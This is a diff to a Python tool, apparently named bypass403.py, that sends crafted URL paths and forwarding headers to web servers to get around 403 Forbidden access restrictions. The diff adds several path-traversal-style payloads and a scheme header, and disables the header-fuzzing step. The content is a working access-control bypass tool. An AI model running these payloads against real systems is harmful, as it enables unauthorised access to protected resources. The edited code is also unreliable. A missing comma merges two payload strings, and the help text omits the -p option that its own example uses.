@@ -11,7 +11,6 @@ USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/2010010
 
 def help():
     print("\t-u URL, --url=URL\tscan url")
-    print("\t-p PATH, --path=PATH\tdir or file")
     print("\t-r , --redirect\tfollow redirection")
     print("EXAMPLES: ")    
     print("\tbypass403.py -u http://example.com -p test")
@@ -63,7 +62,8 @@ def methods_fuzz(url, path, redirect):
 def scheme_fuzz(url, path, redirect):
     protocol_payloads = ["X-Forwarded-Protocol",
                          "X-Forwarded-Proto",
-                         "X-Url-Scheme"]
+                         "X-Url-Scheme",
+                         "X-Forwarded-Scheme"]
     
     scheme_payloads = ["http",
                        "https"]
@@ -151,7 +151,8 @@ def paths_fuzz(url, path, redirect):
                       f"{url}/~{path}",
                       f"{url}/;/{path}",
                       f"{url}/.;/{path}",
-                      f"{url}//;//{path}",                      
+                      f"{url}//;//{path}",
+                      f"{url}/.;/{path}.",
                       f"{url}/{path}.",
                       f"{url}/{path}/",                                            
                       f"{url}/{path}/.",
@@ -166,6 +167,10 @@ def paths_fuzz(url, path, redirect):
                       f"{url}//{path}//",
                       f"{url}//{path}/./",
                       f"{url}///{path}///",
+                      f"{url}/.;/{path}/.",
+                      f"{url}/.;/{path}/./",
+                      f"{url}/.;/{path}/*",
+                      f"{url}/.;/{path}/.."
                       f"{url}/./{path}/",
                       f"{url}/./{path}/..",
                       f"{url}/./{path}/./",                      
@@ -173,7 +178,8 @@ def paths_fuzz(url, path, redirect):
                       f"{url}/{path}/..;/",                      
                       f"{url}/{path}%20",
                       f"{url}/{path}%09",
-                      f"{url}/{path}%00"]
+                      f"{url}/{path}%00",
+                      f"{url}/{path}.json"]
     
     for p in paths_payloads:
         resp = requests.get(p, headers=USER_AGENT, allow_redirects=redirect)        
@@ -232,10 +238,10 @@ def main():
             print("-----------------\n")
             paths_fuzz(url, path, redirect)
             
-            print("\n-------------------")
+            """print("\n-------------------")
             print("[!] Headers fuzzing")
             print("-------------------\n")
-            headers_fuzz(url, path, redirect)
+            headers_fuzz(url, path, redirect)"""
         else:
             help()
     except KeyboardInterrupt:
